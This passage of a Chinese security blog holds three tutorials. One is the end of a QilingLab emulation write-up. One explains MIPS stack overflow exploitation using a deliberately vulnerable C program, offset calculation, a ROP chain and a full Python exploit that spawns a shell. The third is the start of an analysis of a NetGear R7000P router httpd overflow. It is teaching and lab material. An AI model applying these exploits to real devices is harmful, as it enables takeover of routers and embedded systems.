hook_cmdline(QlFsMappedObject):</span><br><span class="line">	def read(self,size):</span><br><span class="line">		return b&quot;qilinglab&quot;</span><br><span class="line">	def close(self):</span><br><span class="line">		return 0</span><br><span class="line">	</span><br><span class="line">def challenge10(ql:Qiling):</span><br><span class="line">	ql.add_fs_mapper(&quot;/proc/self/cmdline&quot;,hook_cmdline())</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    #ql = Qiling([&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;], &quot;rootfs/x8664_linux&quot;, verbose=QL_VERBOSE.DEFAULT)</span><br><span class="line">    path=[&quot;rootfs/x8664_linux/qilinglab-x86_64&quot;]</span><br><span class="line">    rootfs = &quot;rootfs/x8664_linux&quot;</span><br><span class="line">    ql = Qiling(path, rootfs)</span><br><span class="line">    challenge1(ql)</span><br><span class="line">    challenge2(ql)</span><br><span class="line">    challenge3(ql)</span><br><span class="line">    challenge4(ql)</span><br><span class="line">    challenge5(ql)</span><br><span class="line">    challenge6(ql)</span><br><span class="line">    challenge7(ql)</span><br><span class="line">    challenge9(ql)</span><br><span class="line">    challenge10(ql)</span><br><span class="line">    ql.verbose = 0</span><br><span class="line">    ql.mem.show_mapinfo()</span><br><span class="line">    ql.run()</span><br></pre></td></tr></table></figure>





<p>参考讲解：</p>
<p><a target="_blank" rel="noopener" href="https://badmonkey.site/archives/qilinglab-writeup#challenge-11">https://badmonkey.site/archives/qilinglab-writeup#challenge-11</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/18/3__QiLing_%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/" data-id="clqap895q0000lkvb0xlccirt" data-title="QiLing 框架学习WriteUp" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-mips架构___堆栈缓冲区溢出调试与利用" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/" class="article-date">
  <time class="dt-published" datetime="2023-12-18T08:47:08.589Z" itemprop="datePublished">2023-12-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/">mips架构堆栈缓冲区溢出调试与利用</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="mips架构堆栈缓冲区溢出调试与利用"><a href="#mips架构堆栈缓冲区溢出调试与利用" class="headerlink" title="mips架构堆栈缓冲区溢出调试与利用"></a>mips架构堆栈缓冲区溢出调试与利用</h1><h2 id="MIPS-堆栈原理"><a href="#MIPS-堆栈原理" class="headerlink" title="MIPS 堆栈原理"></a>MIPS 堆栈原理</h2><p>栈是一种具有先进后出队列性质的数据结构。调用栈（Call Stack）是指存放某个程序正在运行的函数的信息的栈。调用栈由栈帧(Stack Frame)组成，每个栈帧对应一个未完成运行的函数。<br>这里主要介绍 物联网设备中常见的指令架构MIPS32 ，这个架构中的函数有两种，叶子函数和非叶子函数，判断叶子函数的方式只需要判断函数内是否调用其他函数，有调用则是非叶子函数，没有调用则是叶子函数，</p>
<h3 id="非叶子函数调用过程"><a href="#非叶子函数调用过程" class="headerlink" title="非叶子函数调用过程"></a>非叶子函数调用过程</h3><p>程序在跳转到非叶子函数以后，则非叶子函数会把调用它的函数的返回地址(也就是$RA寄存器)存入堆栈中，再将自己函数返回地址存入到$RA，在函数返回时，非叶子函数会将栈中先前保存的返回地址取出保存到$RA中，再执行 “jr $ra”返回原函数。</p>
<h3 id="叶子函数调用过程"><a href="#叶子函数调用过程" class="headerlink" title="叶子函数调用过程"></a>叶子函数调用过程</h3><p>程序在跳转到叶子函数中，过程比较简单，叶子函数不会改变寄存器$RA的值，因为函数跳转到它，就不会再有跳转了，因此在函数返回时，直接 “jr $ra”返回原函数。</p>
<h3 id="函数调用参数传递"><a href="#函数调用参数传递" class="headerlink" title="函数调用参数传递"></a>函数调用参数传递</h3><p>在MIPS 体系的函数调用过程中，通过$a0~ $a3 传递前四个参数，多余的通过栈传递。</p>
<h3 id="栈空间缓冲区溢出"><a href="#栈空间缓冲区溢出" class="headerlink" title="栈空间缓冲区溢出"></a>栈空间缓冲区溢出</h3><p>栈空间缓冲区是用于内存中存储数据的内存区域。<br>缓冲区溢出就是大缓冲区数据向小缓冲区复制的过程中，由于没有检查小缓冲区的边界或者检车不严格，导致小缓冲区明显不足以接收整个大缓冲区的数据，超出的部分覆盖了与小缓冲区相邻的内存区中的其他数据而引发的内存问题。<br>成功利用缓冲区溢出可能造成严重的后果，基本上可分为3 种情况，分别是拒绝服务、获得用户权限、获得系统权限。</p>
<p>接下来和我一起来学习栈空间缓冲区溢出吧！ ：）</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>系统：Ubuntu 16.04<br>工具：IDA 7.5、QEMU<br>mips交叉编译环境</p>
<h2 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码"></a>漏洞代码</h2><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">mips_stack.c</span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> do_system(<span class="type">int</span> code,<span class="type">char</span> *cmd)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">255</span>];</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">256</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="type">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> fileLen = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> stat fileData;</span><br><span class="line">    FILE *fp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="number">0</span> == stat(<span class="string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,&amp;fileData))</span><br><span class="line">        fileLen = fileData.st_size;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>((fp = fopen(<span class="string">&quot;/home/tigerortiger/study/mips_stack/passwd&quot;</span>,<span class="string">&quot;rb&quot;</span>)) == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;Cannot open file passwd!n&quot;</span>);</span><br><span class="line">        exit(<span class="number">1</span>);</span><br><span class="line">    &#125;    </span><br><span class="line">    ch=fgetc(fp);</span><br><span class="line">    printf(<span class="string">&quot;[+]  1 line : &quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(count &lt;= fileLen)</span><br><span class="line">    &#123;</span><br><span class="line">        buf[count++] = ch;</span><br><span class="line">        ch = fgetc(fp);</span><br><span class="line">    <span class="comment">//printf(&quot;[+]   %s \r\n&quot;,ch);</span></span><br><span class="line">    &#125;</span><br><span class="line">    buf[--count] = <span class="string">&#x27;x00&#x27;</span>;</span><br><span class="line">    printf(<span class="string">&quot;[+] passwd content : %s&quot;</span>,buf[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span>(!strcmp(buf,<span class="string">&quot;adminpwd&quot;</span>))</span><br><span class="line">    &#123;        </span><br><span class="line">        do_system(count,<span class="string">&quot;ls -l&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        printf(<span class="string">&quot;you have an invalid password!n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mips-linux-gcc -static /home/tigerortiger/study/mips_stack/stack.c -o stack</span><br></pre></td></tr></table></figure>

<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>1、首先查看文件信息，可以看到是mips32 架构</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image1.png" alt="image-20231217162032481"></p>
<p>2、根据查看mips_stack.c 的源码或者运行文件可以知道，main()函数会读取passwd 文件，并且将文件的内容种存入局部变量buf 中，而buf 仅为256字节，如果passwd 中的文件大于256字节，那么多余的字节就会导致缓冲区无法放下，造成溢出现象。<br>3、生成600个字符串都passwd<br><code>python -c &quot;print &#39;A&#39;*600&quot;&gt;passwd</code><br>4、执行文件，可以看到”segmentation fault “</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image2.png" alt="image-20231217162032481"></p>
<p>5、接下来进行远程调试，查看栈上的情况<br><code>tigerortiger@ubuntu ~/s/mips_stack&gt; qemu-mips-static -g 1234 ./stack</code></p>
<p>6、使用IDA 进行调试，连接，运行。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image3.png" alt="image-20231217162032481"></p>
<p>7、程序在试图执行0x41414141处的指令时发生了崩溃,这刚好是AAAA的十六进制，0x41414141超出了进程,引发了断段故障</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image4.png" alt="image-20231217162032481"></p>
<p>由此上述分析可知，文件存在缓冲区溢出的漏洞，并且可以将数据覆盖到$RA寄存器中。</p>
<h2 id="漏洞exploit利用开发"><a href="#漏洞exploit利用开发" class="headerlink" title="漏洞exploit利用开发"></a>漏洞exploit利用开发</h2><p>完整漏洞利用开发过程应该是如下的步骤：<br>1、计算局部变量到 返回地址的偏移，也就是buf 到$ra的偏移，劫持PC；<br>2、寻找可利用的攻击方式和途径<br>3、构造ROP Chain<br>4、编写漏洞利用程序</p>
<h3 id="计算偏移"><a href="#计算偏移" class="headerlink" title="计算偏移"></a>计算偏移</h3><p>首先是确定buf 到$ra的偏移<br>这里介绍两种方法来进行计算<br><strong>1、栈帧分析</strong><br>通过静态分析，首先F5 看程序的伪代码，需要确定buf 离栈帧的地址，如下图所示，buf 会和adminpwd 进行比较，因此根据mips种函数调用参数的特性，可以定位到$a0，最终可以定位到 0x1C8+var_198，其中0x1C8 是栈帧的地址。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image5.png" alt="image-20231217162032481"></p>
<p>下面确定buf 的偏移为-0x198 (这里的偏移都是相对栈帧fp), 并且也确定了$ra 的偏移为0x4。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image6.png" alt="image-20231217162032481"></p>
<p>如果需要使缓冲区溢出，控制堆栈的返回地址$ra，需要覆盖的数据大小应该达到 0x4-(-0x198) &#x3D; 0x19c 字节</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image7.png" alt="image-20231217162032481"></p>
<p>确定了布局变量buf到返回的地址大小后，来验证是否正确<br> python -c “print ‘A’*0x19C + ‘BBBB’+’CCCC’” &gt; passwd<br> 如图所示，PC寄存器可以读入BBBB</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image8.png" alt="image-20231217162032481"></p>
<p><strong>2、使用脚本工具</strong><br>脚本自取：【<a target="_blank" rel="noopener" href="https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py%E3%80%91">https://github.com/desword/shellcode_tools/blob/master/patternLocOffset.py】</a><br>使用脚本字符来将生成字符串存储到 passwd 中</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image9.png" alt="image-20231217162032481"></p>
<p>使用IDA 进行远程调试，可以看到在$ra地址处是 0x6E37416E</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image10.png" alt="image-20231217162032481"></p>
<p>使用脚本计算偏移为412，和上面栈帧分析的一样。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image11.png" alt="image-20231217162032481"></p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/t01ee5255112c6ddeb3.png" alt="image-20231217162032481"></p>
<h3 id="寻找可利用的攻击途径"><a href="#寻找可利用的攻击途径" class="headerlink" title="寻找可利用的攻击途径"></a>寻找可利用的攻击途径</h3><p>通过对文件的静态分析，不难发现程序中调用了do_system_0 函数，这个函数会调用system()函数来执行第二个参数，因此只需要将要执行的命令传入do_system_0函数的第二个参数$a1 中即可。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image12.png" alt="image-20231217162032481"></p>
<h3 id="构造ROP-chain"><a href="#构造ROP-chain" class="headerlink" title="构造ROP chain"></a>构造ROP chain</h3><p>这里需要用到IDA脚本插件mipsrop.py<br><strong>1、安装mipsrop.py</strong><br>下载，完了放到ida的plugins目录就行，重启IDA。<br>【<a target="_blank" rel="noopener" href="https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py%E3%80%91">https://github.com/devttys0/ida/blob/master/plugins/mipsrop/mipsrop.py】</a><br>2、打开你的mips程序，点击search——&gt;mips rop gadgets 。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image13.png" alt="image-20231217162032481"></p>
<p>3、输入“ mipsrop.stackfinder() ”查找可用的godget</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image14.png" alt="image-20231217162032481"></p>
<p>4、双击0x00403810 可以看到这里，下面红色框中的代码我们可以用来构造rop chain。<br>为什么这段代码可以使用，是因为我们上面分析过，需要给do_system_0 函数 $a1 传递我们要执行的命令，恰好0x00403810此处将$sp+0x54+var_30内存中值赋值给$a1，只需要将要执行的命令放在$sp+0x54+var_30处，另外我们要调用do_system_0函数，下面0x00403814处 将$sp+0x54+var_s0的值加载到$ra 寄存中，后面会执行” jr $ra”, 让程序跳转到do_system_0继续执行。</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image15.png" alt="image-20231217162032481"></p>
<p>6、最终构造的ROP chain 如下图所示</p>
<p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image-20231217163711370.png" alt="image-20231217163711370"></p>
<h3 id="编写漏洞利用程序"><a href="#编写漏洞利用程序" class="headerlink" title="编写漏洞利用程序"></a>编写漏洞利用程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Explainimport <span class="keyword">struct</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] prepare shellcode&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;sh&quot;</span></span><br><span class="line">cmd += <span class="string">&quot;\00&quot;</span>*(<span class="number">4</span>-(<span class="built_in">len</span>(cmd) %<span class="number">4</span>))  # 栈对齐</span><br><span class="line">shellcode = <span class="string">&quot;A&quot;</span>*<span class="number">0x19C</span></span><br><span class="line">shellcode += <span class="keyword">struct</span>.pack(<span class="string">&quot;&gt;L&quot;</span>,<span class="number">0x00403810</span>)</span><br><span class="line">shellcode += <span class="string">&quot;A&quot;</span>*<span class="number">24</span></span><br><span class="line">shellcode += cmd</span><br><span class="line">shellcode += <span class="string">&quot;B&quot;</span>*(<span class="number">0x3C</span> - <span class="built_in">len</span>(cmd))</span><br><span class="line">shellcode += <span class="keyword">struct</span>.pack(<span class="string">&quot;&gt;L&quot;</span>, <span class="number">0x00400680</span>)</span><br><span class="line">shellcode += <span class="string">&quot;BBBB&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;OK!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] create password file&quot;</span>)</span><br><span class="line">fw = open(<span class="string">&#x27;passwd&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">fw.write(shellcode)</span><br><span class="line">fw.<span class="built_in">close</span>()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ok&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="执行exploit"><a href="#执行exploit" class="headerlink" title="执行exploit"></a>执行exploit</h2><p><img src="/mips%E6%9E%B6%E6%9E%84%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8.assets/image17.png" alt="image-20231217162032481"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://tig3rhu.github.io/2023/12/18/mips%E6%9E%B6%E6%9E%84___%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%A9%E7%94%A8/" data-id="clqaoa64f0000e4vbfb7y854o" data-title="mips架构堆栈缓冲区溢出调试与利用" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-NetGear R7000P 路由器栈溢出漏洞硬件调试与分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/" class="article-date">
  <time class="dt-published" datetime="2023-12-17T08:06:42.931Z" itemprop="datePublished">2023-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/12/17/NetGear%20R7000P%20%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/">NetGear R7000P 路由器栈溢出漏洞硬件调试与分析</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h3><p>NetGear 系列中的路由器存在栈缓冲区溢出漏洞，漏洞的产生是由于在对处理输入的字符串时，将字符串存入栈中，没有对字符串的长度做限制。<br>调试漏洞设备： NetGear R7000P<br>调试漏洞固件版本：R7000P-V1.3.1.64_10.1.36<br>固件下载链接：【<a target="_blank" rel="noopener" href="http://www.downloads.netgear.com/files/GDC/R7000P/R7000P-V1.3.1.64_10.1.36.zip%E3%80%91">http://www.downloads.netgear.com/files/GDC/R7000P/R7000P-V1.3.1.64_10.1.36.zip】</a><br>poc链接： 【<a target="_blank" rel="noopener" href="https://github.com/grimm-co/NotQuite0DayFriday/tree/master/2020.06.15-netgear%E3%80%91">https://github.com/grimm-co/NotQuite0DayFriday/tree/master/2020.06.15-netgear】</a></p>
<h3 id="漏洞静态分析"><a href="#漏洞静态分析" class="headerlink" title="漏洞静态分析"></a>漏洞静态分析</h3><p>把下载好的固件包使用binwali -Me 解开。在后查看httpd 文件所在的位置<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image0-1-1621473365530.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image0-1"><br>首先根据公开的poc 开分析，漏洞产生的点有 “ upgrade_check.cgi “ 的字符串，可以定位到如下图的代码段。可以看到有两处，很明显是下面的判断才能使程序继续往下走，因为第一个判断里面讲初始化的stop_while 原本为1，设置为0，会导致程序去校验其他的文件，无法达到漏洞点。</p>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image1-1621473388030.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image1"></p>
<p>最终会跳转到下面代码片段，最终跳出循环。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image2.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image2"></p>
<p>因为在循环之前，就设置stop_while的值为 1<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image3.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image3"></p>
<p>跳出循环后，往下继续看，发现会对数据进行判断，这里分别对“name&#x3D;”mtenFWUpload”” 和 “\r\n\r\n”进行判断，如果存在，则跳出当前循环</p>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image4.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image4"></p>
<p>跳出循环后，就会执行到将产生溢出点的函数<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image5-1621473639593.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image5"></p>
<p>进入vulfunc函数，可以看到会对数据进行判断是否以”*#$^”开头。然后会将数据通过memcpy函数由src指向地址为起始地址的连续 v9 个字节的数据复制到以 s 指向地址为起始地址的空间内。并且可以看到 v9 的值是可以通过src 中的数据进行获取，因此可以进行通过控制 v9 的大小，将 src 的数据覆盖到 s 中，但 s 的大小只有140个字节，从而造成大缓冲区向小缓冲区复制的数据覆盖相邻内存内的数据。造成栈缓冲区溢出。</p>
<p><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image6-1621473639595.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image6"></p>
<h3 id="接入路由器UART串口"><a href="#接入路由器UART串口" class="headerlink" title="接入路由器UART串口"></a>接入路由器UART串口</h3><p>首先需要识别串口<br>识别工具：万用表、 DSLogic 、 FT232转换USB<br>拆开路由器的外壳，可以很明显的看到路由器PCB 中有UART的四根引脚，如下图所示。<br><img src="/NetGea_R7000P_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E7%A1%AC%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90.assets/Image7-1621474362325.png" alt="NetGea_R7000P_路由器栈溢出漏洞硬件调试与分析.assets/Image7"></p>
<h4 id="识别UART-引脚"><a href="#识别UART-引脚" class="headerlink" title="识别UART 引脚"></a>识别UART 引脚</h4><p>接下来我们来识别UART的引脚。<br>这里使用万用表来识别URAT 四个引脚的定义，<br> URAT 主要的引脚分别是：</p>
<ul>
